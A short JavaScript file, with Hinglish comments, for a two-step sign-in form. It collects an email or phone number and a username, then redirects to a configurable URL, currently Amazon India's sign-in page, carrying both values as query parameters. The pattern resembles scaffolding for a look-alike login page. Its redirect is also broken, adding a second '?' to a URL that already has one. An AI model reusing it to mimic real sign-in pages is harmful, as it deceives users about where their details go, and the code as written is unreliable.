document.addEventListener("DOMContentLoaded", () => {
  // Yahan apni doosri website ka direct URL daalo:
  const TARGET_URL = "https://www.amazon.in/ap/signin?openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_hdr_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=anywhere_v2_in&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";

  // Elements
  const step1 = document.getElementById("step-1");
  const step2 = document.getElementById("step-2");

  const formStep1 = document.getElementById("form-step-1");
  const inputIdentifier = document.getElementById("identifier");
  const identifierError = document.getElementById("identifier-error");

  const formStep2 = document.getElementById("form-step-2");
  const inputUsername = document.getElementById("username");
  const usernameError = document.getElementById("username-error");

  const displayIdentifier = document.getElementById("display-identifier");
  const changeBtn = document.getElementById("change-btn");

  let userIdentifier = "";

  // Step 1: Handle Email/Phone Submit
  formStep1.addEventListener("submit", (e) => {
    e.preventDefault();
    const val = inputIdentifier.value.trim();

    if (val === "") {
      identifierError.textContent = "Please enter your email or phone number";
      identifierError.classList.add("visible");
      inputIdentifier.classList.add("input-error");
      return;
    }

    identifierError.classList.remove("visible");
    inputIdentifier.classList.remove("input-error");

    userIdentifier = val;
    displayIdentifier.textContent = val;

    // Transition to Step 2
    step1.classList.add("hidden");
    step2.classList.remove("hidden");
    inputUsername.focus();
  });

  // Step 2: "Change" Button Click (Back to Step 1)
  changeBtn.addEventListener("click", (e) => {
    e.preventDefault();
    step2.classList.add("hidden");
    step1.classList.remove("hidden");
    inputIdentifier.focus();
  });

  // Step 2: Handle Username Submit & Redirect
  formStep2.addEventListener("submit", (e) => {
    e.preventDefault();
    const usernameVal = inputUsername.value.trim();

    if (usernameVal === "") {
      usernameError.textContent = "Please enter your username";
      usernameError.classList.add("visible");
      inputUsername.classList.add("input-error");
      return;
    }

    usernameError.classList.remove("visible");
    inputUsername.classList.remove("input-error");

    // Redirection with URL query parameters so target site receives the data
    const finalRedirect = `${TARGET_URL}?contact=${encodeURIComponent(userIdentifier)}&username=${encodeURIComponent(usernameVal)}`;
    window.location.href = finalRedirect;
  });
});
